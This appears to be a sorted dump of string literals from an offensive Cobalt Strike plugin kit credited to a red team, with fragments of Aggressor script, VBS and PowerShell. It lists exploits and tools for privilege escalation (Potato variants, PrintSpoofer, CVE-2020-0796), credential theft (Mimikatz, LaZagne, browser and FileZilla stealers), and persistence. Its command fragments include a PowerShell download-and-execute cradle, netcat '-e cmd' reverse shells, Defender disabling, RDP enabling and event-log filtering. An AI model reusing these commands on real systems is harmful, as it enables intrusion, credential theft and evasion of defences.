"""			      v0.6beta       By. Xiangshan@360RedTeam "
"""	"
"""            .NodeTypedValue = StrToBytes(sText, "
"""        .Charset = sTextEncoding"
"""        .Close"
"""        .DataType = "
"""        .Open"
"""        .Position = 0 "
"""        .Position = iBomByteCount "
"""        .Type = 1  "
"""        .Type = 2"
"""        .WriteText sText"
"""        Base64Encode = .Text"
"""        StrToBytes = .Read"
"""        else"
"""        end if"
"""        if fAsUtf16LE then"
"""      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))"
"""    -allkeys     Use all DPAPI keys found in the credential store (not just the DPAPI keys found on this host)\n\n"
"""    -dump        Use mimikatz to dump DPAPI keys from lsass using Mimikatz's sekurlsa::dpapi\n"
"""    .Close"
"""    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName"
"""    .Position = 2: .CopyTo bStream: .Close"
"""    .Type = 2 : .Open: .WriteText aBuf"
"""    Else"
"""    End If"
"""    End With "
"""    End With"
"""    For I = 0 To .Size - 1: Buf(I) = AscB(.Read(1)): Next"
"""    If UCase(LoginUser) = "
"""    LoginUser = Empty"
"""    ReDim Buf(.Size - 1)"
"""    With CreateObject("
"""    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\"
"""   $file"
"""   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \ "
"""  $+ $GETRES"
"""  $+ \"
"""  /cmd"
"""  >>  "
"""  Dim Buf(), I"
"""  Dim I, aBuf, Size, bStream"
"""  End With"
"""  For I = 0 To Size - 1 Step 2"
"""  GETRES?"
"""  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))"
"""  Next"
"""  ReadBinary = Buf"
"""  Set bStream = CreateObject("
"""  Set bStream = Nothing"
"""  Size = UBound(Buf): ReDim aBuf(Size \ 2)"
"""  With CreateObject("
"""  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  / "
"""  _-"
"""  aBuf=Join(aBuf, "
"""  bStream.SaveToFile FileName, 2: bStream.Close"
"""  bStream.Type = 1: bStream.Open"
"""  command"
"""  host"
""" "
""" $+ $File \"
""" $+ $NCpath  $+ $NCip  $+ $NCport -e cmd\"
""" $+ $Name\"
""" $+ $Path\"
""" $+ $oneliner $+ \"
""" $+ $path\"
""" $3['domain'] $3['user'] $3['pass']"
""" $3['filepath']"
""" $EventLogPath$EventLogName"
""" $RemoteComputer"
""" & "
""" & chr(34) & "
""" & chr(34) & Schedule_Name &chr(34)&"
""" & chr(34) & file & chr(34) & "
""" & chr(34) & file & chr(34) &"
""" & chr(34)"
""" & cmd & "
""" & objItem.Hour & "
""" & objItem.Minute & "
""" & vbTab & "
""" & vbTab & vbTab & "
""" &chr(34)& Schedule_Name &chr(34)&"
""" &chr(34)&"
""" ("
""" *.*"
""" + $MappedUserName) -Join "
""" + $Session) -Name "
""" + ' -Name ' + "
""" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "
""" + (Get-Date -Format "
""" + (Split-Path -Leaf $UserObject."
""" , %(beacon => $1 , domain => "
""" , %(bid => $1['@'] , domain => "
""" , hash => "
""" , user => "
""" ,script_resource("
""" --Arguments \"
""" --Author $3['Author'] --Command \"
""" --GPOName \"
""" --UserAccount $3['UserAccount'] --GPOName \"
""" --rule=\"
""" -Context 0,$NumberOfPrivateKeyLines).Context.PostContext -Join "
""" -a \"
""" -command $Command"
""" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
""" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
""" -f $(Bitmap-Read -Address $SysEprocessPtr))"
""" -f $NextProcess)"
""" -f $ProcessInfo.dwProcessId)`n"
""" -f $SysEprocessPtr)"
""" -m add -o $3['schtask_time']"
""" -m add"
""" -n \"
""" -or !$RDPFileObject."
""" -or $RDPFileObject."
""" . $mypipe . "
""" . $sha1, $Domain, "
""" . $url . "
""" . binfo($1,"
""" . join("
""" . listener_describe($3['listener']) . "
""" /d 1 /t REG_DWORD"
""" /domain"
""" /f "
""" /q:"
""" /v UserInitMprLogonScript /t REG_SZ /d \"
""" /v \"
""" /v fDenyTSConnections /t REG_DWORD /d 0 /f\'"
""" /v fDenyTSConnections /t REG_DWORD /d 1 /f\'"
""" 1"
""" = "
""" = try { (Select-String -Path $Path -Pattern "
""" => "
""" > "
""" Adobedll.dll; rundll32.exe Adobedll.dll,StartW"
""" And pass = "
""" C:\\Windows\\system32\\userinit.exe, $+ $File \"
""" EfsPotato"
""" Else sTextEncoding = "
""" FullPowers"
""" JuicyPotato (ms16-075)"
""" MS16-135"
""" PrintSpoofer"
""" SweetPotato (ms16-075)"
""" Then"
""" \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |"
""" \"
""" add-type -assemblyName `'System.Core`';`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(`'.`', `'$npipeName`', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;`$playerName = `'ping`';`$npipeClient.Connect();`$pipeWriter = new-object System.IO.StreamWriter(`$npipeClient);`$pipeReader = new-object System.IO.StreamReader(`$npipeClient);`$pipeWriter.AutoFlush = `$true;`$pipeWriter.WriteLine(`$playerName);IEX `$pipeReader.ReadLine();`$npipeClient.Dispose();"
""" binpath= \"
""" cve-2020-0796"
""" eventname=$3['eventname'] attime=$3['attime'] "
""" key=clear"
""" lnkicon=\"
""" lnkname=\"
""" lnkpath=\"
""" lnktarget=\"
""" ms14-058"
""" ms15-051"
""" ms16-016"
""" ms16-032"
""" not supported for cpu option "
""" protocol=TCP dir=in localport=3389 action=allow"
""" protocol=TCP dir=in localport=3389 action=allow\'"
""" start= auto&&net start  $+ $Name"
""" to dump the masterkeys on the current machine from lsass.exe"
""" to dump the masterkeys on the current machine from lsass.exe\n"
""" to use all DPAPI keys found in the credential store."
""" via RottenPotato (ms16-075)"
""" via cve-2019-0803"
""" | findstr \"
""" || lc($3) eq "
""""" & chr(34) & "
""""" &chr(34)&"
""""" | Select-Object -Property "
""""""
"""""$"
""""", "
""""", chr(34) & "
""""", pass => "
""""", vkey => "
""""",,type => "
""""",GPOName => "
""""",arguments => "
""""",cmd => "
""""",domain => "
""""",hostname => "
""""",localpath => "
""""",pass => "
""""",passwd => "
""""",password => "
""""",path => "
""""",remotepath => "
""""",type => "
""""",user => "
""""",username => "
"""##  ApplockerEnumerating-AppLocker           ##"
"""##  LAPS-Existance of LAPS                   ##"
"""##############"
"""###############"
"""#################"
"""###################"
"""####################"
"""#####################"
"""######################"
"""#######################"
"""########################"
"""#########################"
"""##########################"
"""#############################"
"""##############################"
"""################################"
"""#################################"
"""###################################"
"""###############################################"
"""####################################################"
"""#text"
"""$($OSVersion.Major).$($OSVersion.Minor)"
"""$1\"
"""$3['Arguments']\"
"""$3['Command']\"
"""$3['GPOName']\"
"""$3['Keyword']\"
"""$3['ScriptContents']\"
"""$3['Taskname']\"
"""$3['UserRights']\"
"""$3['cmd']"
"""$3['command']\"
"""$3['computername']"
"""$3['filename'] /Q /NORESTART /lcid 1033"
"""$3['filepath']\"
"""$3['groupname']"
"""$3['lnkicon']\"
"""$3['lnkname']\"
"""$3['lnkpath']\"
"""$3['lnktarget']\"
"""$3['modifytime']\"
"""$3['path'] $3['outpath']"
"""$3['path']"
"""$3['path']\"
"""$3['payload']\"
"""$3['schtask_name']\"
"""$3['schtasks_description']\"
"""$3['service_name']\"
"""$3['target'] $3['service'] \"
"""$3['type']"
"""$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
"""$EventRecordID"
"""$File"
"""$IpAddress"
"""$KernelType"
"""$SID"
"""$command\"
"""$exec"
"""$fname\"
"""$guid:$masterkey"
"""$localpath\"
"""$msg\"
"""$output"
"""$pass\"
"""$remotepath\"
"""%4"
"""%hs"
"""&&sc config \"
"""&Chr(34)&file&chr(34)&"
"""&cmd&"
"""&cmd&chr(34)&"
"""&exec_time&"
"""&file&"
"""&secquan.org@panda8"
"""&t00ls.com@panda8"
"""&xway.cn@panda8"
"""' + $remote_command + '"
"""' . $1 . '"
"""'$fullregistrypath'"
"""'$registrydownname'"
"""')]]"
"""(Hostname)"
"""(objectCategory=$strCategory)"
""") + "
""") , lambda({ bdcsync($3["
""") -Name "
""") . "
""") CALL SetAllowTSConnections 0"
""") CALL SetAllowTSConnections 1"
""")"
"""), "
"""), $2, "
"""), $args, "
"""), $pipename, "
"""), $stager, "
"""),' \*',"
"""),port => "
""").CreateElement("
"""********"
"""*8.8.8.8:3389"
"""*[EventData[(Data[@Name='IpAddress']!='"
"""*[System[(EventID !='1024')]]"
"""*[System[(EventID !='1149')]]"
"""*[System[(EventID !='131') and (EventID !='140')]]"
"""*[System[(EventID !='21') and (EventID !='22') and (EventID !='24') and (EventID !='25')]]"
"""*[System[(EventID=21) or (EventID=22) or (EventID=24) or (EventID=25)]]"
"""*[System[(EventRecordID!='"
"""+ $Target + "
"""+"
"""+$User.Name+"
"""+$User.SID+"
""",  "
""", "
""", $Domain, "
""", $help, "
""", %(EventLogType => "
""", %(OutFile => "
""", %(Path => "
""", %(ScriptName => "
""", %(Taskname => "
""", %(Type => "
""", %(UploadPath => "
""", %(UserAccount => "
""", %(UserRights => "
""", %(args => "
""", %(bid => $1['@'] , domain => "
""", %(cmd => "
""", %(command => "
""", %(computername => "
""", %(content => "
""", %(domain => "
""", %(downPath => "
""", %(filename => "
""", %(filepath => "
""", %(host => "
""", %(ip => "
""", %(iptype => "
""", %(name => "
""", %(passwd => "
""", %(path => "
""", %(payload => "
""", %(port => "
""", %(servicename => "
""", %(sessionpath => "
""", %(target => "
""", %(type => "
""", %(url => "
""", %(user => "
""", 2)"
""", 3)"
""", @("
""", CallBackFile => "
""", EntryPoint="
""", GETRES => "
""", HKEY_LOCAL_MACHINE, "
""", Path => "
""", RegItem => "
""", ["
""", arrData)"
""", command => "
""", hex => "
""", localpath => "
""", pass => "
""", password => "
""", port => "
""", remotepath => "
""", rhost => "
""", taskDefinition, 6, LoginUser, , 3)"
""", thread => "
""", type => "
""", user => "
""", username => "
""", { url_open("
""","
""",$3['Sleep'],"
""",$3['cmdpath'],"
""",$3['computername'],"
""",$3['domain'],"
""",$3['filename'],"
""",$3['host'],"
""",$3['ip'],"
""",$3['localpath'],"
""",$3['outfile'],"
""",$3['pass'],"
""",$3['password'],$3['type'],"
""",$3['ports'],"
""",$3['thread'],"
""",$3['type'],"
""",$3['url'],"
""",$3['user'],"
""",$3['username'],"
""",%(NCpath => "
""",%(RegKey => "
""",%(SerName => "
""",%(Type => "
""",%(exec => "
""",%(host => "
""",%(ip => "
""",%(lhost => "
""",%(server => "
""",%(targets => "
""",%(user => "
""",0)"
""",1)"
""",Arguments => "
""",Author => "
""",Command => "
""",Delay => "
""",GPOName => "
""",Keyword => "
""",NCip => "
""",NCport => "
""",ScriptContents => "
""",Sleep => "
""",UserAccount => "
""",args => "
""",attime => "
""",b64_content)"
""",cmd => "
""",cmdpath => "
""",command => "
""",domain => "
""",enable => "
""",eventname => "
""",file => "
""",filepath => "
""",group => "
""",groupname => "
""",groups => "
""",ip => "
""",ip => beacon_info($bid,"
""",lnkicon => "
""",lnkname => "
""",lnkpath => "
""",lnktarget => "
""",localpath => "
""",modifytime => "
""",outfile => "
""",outpath => "
""",pass => "
""",passwd => "
""",path => "
""",payload => "
""",permission => "
""",port => "
""",ports => "
""",schtask_name => "
""",schtask_time => "
""",schtasks_description => "
""",schtasks_name => "
""",service => "
""",service_name => "
""",sheetname => "
""",sid => "
""",strValue"
""",thread => "
""",time => "
""",type => "
""",url => "
""",user => "
"""-"
"""----------------------------------"
"""--AddComputerTask --TaskName \"
"""--AddLocalAdmin --UserAccount $3['UserAccount'] --GPOName \"
"""--AddTask $3['host'] $3['time'] \\ $3['schtasks_name'] \"
"""--AddUserRights --UserRights \"
"""--AddUserScript --ScriptName $3['ScriptName'] --ScriptContents \"
"""--Delay"
"""--GetRunning $3['host']"
"""--ListAll $3['host'] \\"
"""--Passwords"
"""--RemoveTask $3['host'] \\ $3['schtasks_name']"
"""--Seeds"
"""--Sleep"
"""--action GET_POLICIES"
"""--enableHistory"
"""-4624"
"""-4625"
"""-AV"
"""-All"
"""-AllUserDirectories"
"""-ApplockerEnumerating"
"""-AvProcessEDRproduct"
"""-CIP"
"""-CsharpVersion"
"""-Defender"
"""-Downgrade True -Verbose True"
"""-Drives"
"""-EnvironmentalVariables"
"""-FileZilla"
"""-Foxmail"
"""-GetRecycle"
"""-IP"
"""-KB"
"""-LAPS"
"""-Navicat"
"""-NetworkConnentions"
"""-OutFile"
"""-Pass2User"
"""-Password"
"""-PowershellInfo"
"""-RealVNC"
"""-RecentFiles"
"""-TeamViewer"
"""-TortoiseSVN"
"""-User2Pass"
"""-Username"
"""-WinSCP"
"""-Xmanager"
"""-allkeys"
"""-b"
"""-c"
"""-c="
"""-d"
"""-d="
"""-dns"
"""-dns/-http/all"
"""-dump"
"""-e"
"""-e="
"""-f="
"""-g"
"""-group="
"""-group=$3['Type'] -outputfile=\"
"""-h"
"""-host"
"""-http"
"""-i"
"""-i="
"""-ip/-cip"
"""-l 6363 "
"""-m="
"""-mssql"
"""-mysql"
"""-mysql/-mssql"
"""-o"
"""-p $program "
"""-p"
"""-p="
"""-query"
"""-rdp0"
"""-rdp1"
"""-s $3['filepath'] -t \"
"""-s $shellcode"
"""-sp"
"""-t schtask -c \"
"""-t schtaskbackdoor -c \"
"""-t service -c \"
"""-t"
"""-u"
"""-u="
"""-v"
"""-xp"
"""-xp/-sp"
"""."
""".$Pwd."
""".$dll), $stager, "
"""..."
""".\"
""".cmd"
""".evtx"
""".ppk"
""".rdp"
""".sdtid"
"""/"
"""/CVE-2020-0796.x64.dll"
"""/c "
"""/c $3['payload']\"
"""/c powershell.exe -nop -w hidden -c \"
"""/cmd"
"""/download"
"""/modules/aggressor"
"""/path:$3['path']"
"""/script/0803.exe"
"""/script/360bowser.exe"
"""/script/ATPMiniDump.exe"
"""/script/BypassAddUser.exe"
"""/script/CredPhisher.exe"
"""/script/EfsPotato.exe"
"""/script/EncryptedZIP.exe"
"""/script/FakeLogonScreen.exe"
"""/script/FullPowers.dll"
"""/script/InternalMonologue.exe"
"""/script/Invoke-MS16032.ps1"
"""/script/Invoke-MS16135.ps1"
"""/script/JuicyPotato.x64.dll"
"""/script/JuicyPotato.x86.dll"
"""/script/Ladon.exe"
"""/script/Ladon1.exe"
"""/script/ListAllUsers.ps1"
"""/script/ListLogged-inUsers.ps1"
"""/script/LocalSessionManager.ps1"
"""/script/MaceTrap.exe"
"""/script/Net-GPPPassword.exe"
"""/script/NoPowerShell.exe"
"""/script/Recon-AD-AllLocalGroups.dll"
"""/script/Recon-AD-Computers.dll"
"""/script/Recon-AD-Domain.dll"
"""/script/Recon-AD-Groups.dll"
"""/script/Recon-AD-LocalGroups.dll"
"""/script/Recon-AD-SPNs.dll"
"""/script/Recon-AD-Users.dll"
"""/script/ReflectiveDll.x64.dll"
"""/script/RegRdpPort.ps1"
"""/script/RottenPotato/"
"""/script/SPNSearcher.exe"
"""/script/SafetyKatz.exe"
"""/script/Seatbelt.exe"
"""/script/SessionGopher.ps1"
"""/script/SharPersist.exe"
"""/script/Sharp3389.exe"
"""/script/SharpAVKB.exe"
"""/script/SharpBypassUAC.exe"
"""/script/SharpChassisType.exe"
"""/script/SharpCheckInfo.exe"
"""/script/SharpClipHistory.exe"
"""/script/SharpCloud.exe"
"""/script/SharpDecryptPwd.exe"
"""/script/SharpDecryptPwd2.exe"
"""/script/SharpDir.exe"
"""/script/SharpDirLister.exe"
"""/script/SharpDomainSpray.exe"
"""/script/SharpDomainSpray/SharpDomainSpray.exe"
"""/script/SharpDoor.exe"
"""/script/SharpEDRChecker.exe"
"""/script/SharpEventLog.exe"
"""/script/SharpExcelibur.exe"
"""/script/SharpExec.exe"
"""/script/SharpGPOAbuse.exe"
"""/script/SharpGetTitle.exe"
"""/script/SharpHide.exe"
"""/script/SharpHound.exe"
"""/script/SharpNetCheck.exe"
"""/script/SharpOXID-Find.exe"
"""/script/SharpSCshell.exe"
"""/script/SharpSQLDump.exe"
"""/script/SharpSQLTools.exe"
"""/script/SharpShares.exe"
"""/script/SharpSpray.exe"
"""/script/SharpStay.exe"
"""/script/SharpTask.exe"
"""/script/SharpWebScan.exe"
"""/script/SharpXDecrypt.exe"
"""/script/SharpZip.exe"
"""/script/SpoolTrigger.x64.dll"
"""/script/SpoolTrigger.x86.dll"
"""/script/Stealer.exe"
"""/script/SweetPotato.exe"
"""/script/Telemetry.exe"
"""/script/WMIHACKER.vbs"
"""/script/Watson.exe"
"""/script/blocketw.exe"
"""/script/chfs.exe"
"""/script/crack.exe"
"""/script/cve-2014-4113.x64.dll"
"""/script/cve-2014-4113.x86.dll"
"""/script/cve-2015-1701.x64.dll"
"""/script/cve-2015-1701.x86.dll"
"""/script/cve-2016-0051.x86.dll"
"""/script/dazzleUP_Reflective_DLL.x64.dll"
"""/script/dis_defender.exe"
"""/script/hack-browser-data.exe"
"""/script/iox.exe"
"""/script/lazagne.exe"
"""/script/noNetApiAdd.exe"
"""/script/scout.exe"
"""/script/scrying.exe"
"""/script/sharpwmi.exe"
"""/script/x64/PrintSpoofer.dll"
"""/script/x64/PrintSpoofer.exe"
"""/script/x64/frpc.exe"
"""/script/x64/fscan.exe"
"""/script/x64/nc.exe"
"""/script/x64/npc.exe"
"""/script/x86/PrintSpoofer.dll"
"""/script/x86/PrintSpoofer.exe"
"""/script/x86/frpc.exe"
"""/script/x86/fscan.exe"
"""/script/x86/npc.exe"
"""/shell"
"""/sid:$3['sid']"
"""/test.dll"
"""/upload"
"""/user:$3['user']"
"""0"
"""00.000000"
"""0123456789ABCDEF"
"""0803.exe cmd  $+ \"
"""0x$('{0:X}' -f $Cast.ImageSize)"
"""1 or 0"
"""100"
"""1000"
"""123,888"
"""123456"
"""127.0.0.1"
"""127.0.0.1:3389"
"""127.0.0.1||127.0.0.1/24"
"""15"
"""192.168.1.0/24"
"""192.168.1.1"
"""192.168.1.1/24"
"""2019-02-19 01:01:01.111"
"""24h:time|12:30"
"""3389"
"""360 SafeBrowser DB Downloading"
"""360bowser.exe /auto"
"""360se6\\Application\\360se.exe"
"""5!Y"
"""6.1"
"""656565"
"""8.8.8.8"
"""80,8080,8001,1433"
"""80-99,443,7001"
"""8080"
"""8888"
""": (.*)"
""":"
"""::| $+ $user $+ : $+ $pass $+ : $+ $permission\"
"""> $+ $fname"
"""A"
"""ADODB.Stream"
"""ATPMiniDump"
"""ATPMiniDump.exe"
"""Action.Path = "
"""Action.arguments = chr(34) & "
"""ActiveScriptEventConsumer"
"""Administrative Session"
"""Alert"
"""An error occurred. Return code: "
"""Arguments"
"""Arguments:  "
"""Arguments:\n"
"""Author"
"""Author:  "
"""Auto Run"
"""BackdoorLNK"
"""Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)"
"""Beacon:"
"""Bid:"
"""Bin Path: "
"""Binary value added successfully"
"""BrowserGhost"
"""BypassUAC"
"""BypassUac"
"""C:/Users/administrator/Desktop/SharpDPAPI.exe"
"""C:\Documents and Settings\"
"""C:\Users\"
"""C:\Users\$MappedUserName\AppData\Roaming\FileZilla\sitemanager.xml"
"""C:\Users\$MappedUserName\Documents\SuperPuTTY\Sessions.xml"
"""C:\Windows\System32\cmd.exe"
"""C:\Windows\Temp\"
"""C:\\"
"""C:\\123.xlsx"
"""C:\\Progra~1\\Intern~1\\iexplore.exe -k $1"
"""C:\\Users\\$3['user']\\AppData\\Roaming\\SogouExplorer"
"""C:\\Users\\administrator\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\"
"""C:\\Windows\\System32\\cmd.exe"
"""C:\\Windows\\System32\\cmd.exe\"
"""C:\\Windows\\Temp"
"""C:\\Windows\\Temp\\"
"""C:\\Windows\\Temp\\1.txt"
"""C:\\Windows\\Temp\\123.exe"
"""C:\\Windows\\Temp\\123.exe\"
"""C:\\Windows\\Temp\\payload.exe"
"""C:\\Windows\\WindowsUpdate.log"
"""C:\\Windows\\system32\\cmd.exe"
"""C:\\Windows\\system32\\notepad.exe"
"""C:\\Windows\\temp\\fun.exe"
"""C:\\Windows\\temp\\payload.exe"
"""C:\\\$Recycle.Bin"
"""C:\\payload.exe"
"""C:\\users\\admin\\desktop"
"""C:\\users\\user\\desktop\\Excel.lnk"
"""C:\\windows"
"""C:\\windows\\Temp"
"""C:\\windows\\Temp\\123.txt"
"""C:\\windows\\temp"
"""C:\\windows\\temp\\123.exe"
"""COMPUTERNAME|IPADDRESS"
"""CVE-2019-0803"
"""CVE-2020-0796"
"""Call rootFolder.DeleteTask("
"""Call rootFolder.RegisterTaskDefinition("
"""Call service.Connect"
"""CallBackFile"
"""CallBackFile: "
"""Cannot send message with SYSTEM !"
"""CertUtil Web Delivery (Stageless)"
"""CertUtil Web Delivery"
"""Check Rdp Open Port"
"""Chrome -full"
"""Chrome"
"""Command"
"""Command:  "
"""Comment"
"""Comment: (.*)"
"""Computer|local|hostname|ip"
"""Connecting to target for activities"
"""Connection established for exploitation."
"""Connects to admin session on remote host"
"""Const ActionTypeExec = 0 "
"""Const TriggerTypeDaily = 1 "
"""Copies all DPAPI master keys in the credential store to the clipboard."
"""Copy/Paste One-liner: "
"""Could not find ReflectiveLoader"
"""CreateService"
"""CredPhisher"
"""D:\\xshell\\Xshell\\Sessions"
"""DBPath"
"""DOMAIN\Admin"
"""DPAPI master keys currently in Cobalt Strike's credential store (use these with SharpDPAPI):\n\n"
"""DarkGreen"
"""Debug"
"""DecryptXShell"
"""Default Server Policy"
"""Delay"
"""Delay:  "
"""Df"
"""Digging on"
"""Dim Action"
"""Dim objNet, LoginUser"
"""Dim regInfo"
"""Dim rootFolder"
"""Dim settings"
"""Dim taskDefinition"
"""Dim trigger"
"""Dim triggers"
"""DisableAntiSpyware\"
"""Disabling RdpThief"
"""Does not connect to admin session on remote host"
"""Domain Controllers\"
"""Domain:"
"""DomainIP"
"""DomainInfo"
"""Done!"
"""Drive='C:' AND Path='\\Users\\$MappedUserName\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
"""Drive='C:' AND Path='\\Users\\$MappedUserName\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
"""Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'"
"""DumpLsass"
"""EfsPotato"
"""EnableDotNet"
"""Encryption: (.*)"
"""End Function"
"""End Sub"
"""EventID"
"""EventLog Type:"
"""EventLogType"
"""EventRecordID"
"""Example: spoolsystem inject\n"
"""Example: spoolsystem spawn"
"""Exec: "
"""Exploit"
"""ExtraArgs"
"""Extracts credential manager and vault credentials using SharpDPAPI.  Extracts DPAPI master keys using Mimikatz."
"""Extracts credential manager and vault credentials using SharpDPAPI."
"""FRP"
"""FakeLogonScreen"
"""File Download Success"
"""FileSystem"
"""FileZilla Sessions"
"""FileZilla"
"""FormData3.dat"
"""Foxmail"
"""Fscan"
"""FtpScan"
"""FullPowers"
"""Function Base64Encode(ByVal sText, ByVal fAsUtf16LE)"
"""Function ReadBinary(FileName)"
"""GETRES"
"""GETRES: "
"""GLITTER"
"""GPOName"
"""GPOName:  "
"""Gateway"
"""Get RDP TerminalServices LocalSessionManager EventLog (ID=21&22&24&25)"
"""Get-Content"
"""Get-HotFix"
"""Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | ft"
"""Get-NetIPAddress -All"
"""Get-NetIPAddress"
"""Get-NetNeighbor"
"""Get-NetRoute"
"""Get-PSDrive"
"""Get-Process -ComputerName"
"""Get-SmbMapping"
"""GetIP"
"""GetInfo"
"""GetPipe"
"""GetStringValue"
"""GetSystem"
"""Gets SYSTEM via spoolss"
"""HH"
"""HH.mm.ss"
"""HKCU"
"""HKCU\\Environment\"
"""HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hello\"
"""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography"
"""HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\"
"""HKEY_USERS\"
"""HKLM"
"""HKLM:\Software\Microsoft\DRM"
"""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"
"""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
"""HTTP"
"""Hash:"
"""HistoryUrl3.db"
"""Host"
"""HostIP"
"""HostName"
"""Hostname"
"""HttpBasicScan"
"""I-"
"""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"
"""IFEO"
"""IISpwd"
"""If admin, run \"
"""Injecting into mstsc.exe with PID: $pid"
"""Injecting spooltrigger into PID: "
"""Install"
"""Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS"
"""Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help"
"""InternalMonologue binary cannot be found at $binary"
"""Invoke-MS16032 -Command \"
"""Invoke-MS16135 -Command \"
"""Invoke-SessionGopher -Thorough"
"""IpAddress"
"""Key: "
"""Keyword"
"""LaZagne"
"""Ladon"
"""Ladon-brute"
"""Launch"
"""LdapScan"
"""Let's enumerate the $3['computername']\n"
"""Let's enumerate the $3['type']\n"
"""Let's enumerate the Recon-AD-Domain\n"
"""Let's enumerate the Recon-AD-SPNs\n"
"""Listener: "
"""Local Host: "
"""Local Port: "
"""LocalSessionManager"
"""LoginUser = objNet.UserName"
"""Logon Scripts"
"""MS14-058"
"""MS15-051"
"""MS16-016"
"""MS16-032"
"""MS16-075"
"""MS16-135"
"""MachineGuid Get Success"
"""MachineGuid"
"""Microsoft RDP Connection Files (.rdp)"
"""Microsoft RDP Sessions"
"""Microsoft Remote Desktop (RDP) Sessions"
"""Microsoft"
"""Microsoft.PowerShell.Core\Registry::"
"""Mimikatz Backup Keys"
"""Mimikatz Credential Manager"
"""Mimikatz DPAPI System Secret"
"""Mimikatz DPAPI"
"""Mimikatz Dump Trust"
"""Mimikatz Kerberos Credentials"
"""Mimikatz LiveSSP passwords"
"""Mimikatz Logon Passwords"
"""Mimikatz MSV LM & NTLM Passwords"
"""Mimikatz SSP passwords"
"""Mimikatz Tickets"
"""Mimikatz TsPkg Passwords"
"""Mimikatz WDigest Credentials"
"""Mimikatz complete. Executing SharpDPAPI"
"""Mimikatz complete. Executing SharpDPAPI..."
"""Mimikatz ekeys"
"""Mimikatz"
"""Mimikatz-pth"
"""MssqlScan"
"""Mstsc"
"""Msxml2.DOMDocument"
"""MysqlScan"
"""NCip"
"""NCpath"
"""NCport"
"""NDP452-KB2901907-x86-x64-AllOS-ENU.exe"
"""NPS"
"""NTLM DCOM->RPC NTLM Reflection (MS16-075)"
"""NTLM hash"
"""Navicat"
"""NetVer"
"""NewLNK"
"""No $arch stager for listener ' $+ $3['listener'] $+ '"
"""No RDP Connections History"
"""No masterkeys found on the current host.\n"
"""No masterkeys found.\n"
"""No"
"""NoAmci"
"""None"
"""Notepad.lnk"
"""Nslookup -type=SRV _ldap._tcp"
"""OKOnly,MsgBoxSetForeground,SystemModal,Exclamation"
"""OSScan"
"""OnlineIP"
"""OnlinePC"
"""Only use plain FTP (insecure)"
"""Open3389"
"""OracleScan"
"""OutFile"
"""PASSWORDS"
"""PATCHME"
"""PPK Files"
"""Part2"
"""Pass"
"""Pass-The-Hash"
"""Password"
"""Path"
"""Permission Denied!"
"""Ping"
"""Please specify an execution method."
"""Port"
"""PrintSpoofer"
"""PrintSpoofer.exe -c \"
"""Private Key Encryption"
"""Private Key"
"""Private MAC"
"""Private-Lines: (.*)"
"""Private-MAC: (.*)"
"""ProfileImagePath"
"""Prompts for Credentials"
"""Protocol"
"""PsInitialSystemProcess"
"""PuTTY Private Key Files (.ppk)"
"""PuTTY Session"
"""PuTTY Sessions"
"""Putty Session"
"""QQ"
"""QQ_\"
"""RDCMan"
"""RDP Files"
"""RDP Sessions"
"""RDP-Tcp PortNumber: "
"""REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\"
"""RSA Tokens (sdtid)"
"""RdpLog"
"""RdpThief enabled \n"
"""RdpThief"
"""Read File To Reg Success"
"""ReadMe"
"""Reading remote file and writing on remote registry"
"""Recent"
"""Recon-AD-AllLocalGroups"
"""Recon-AD-Computers"
"""Recon-AD-Domain"
"""Recon-AD-Groups"
"""Recon-AD-LocalGroups"
"""Recon-AD-SPNs"
"""Recon-AD-Users"
"""ReflectiveDll"
"""Reg unload $Path"
"""Reg"
"""RegAuto"
"""RegAuto-arg"
"""RegItem"
"""RegItem: "
"""RegKey"
"""RegRdpPort"
"""Registration service"
"""Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
"""Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
"""Registry::HKEY_USERS\"
"""Remote -full"
"""Remote Desktop\"
"""Require explicit FTP over TLS"
"""Require implicit FTP over TLS"
"""Res Need Or Not, Use 1 Or 0"
"""Resolve-DnsName"
"""ReverseHttp"
"""ReverseHttps"
"""ReverseTcp"
"""ReverseTcp:"
"""RottenPotato"
"""Run"
"""RunOnce"
"""RunOnceEx"
"""Running final exploit packet"
"""SELECT * FROM CIM_DataFile where name="
"""SELECT * FROM Win32_LocalTime"
"""SELECT * FROM Win32_OperatingSystem"
"""SELECT * FROM Win32_TimeZone"
"""SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
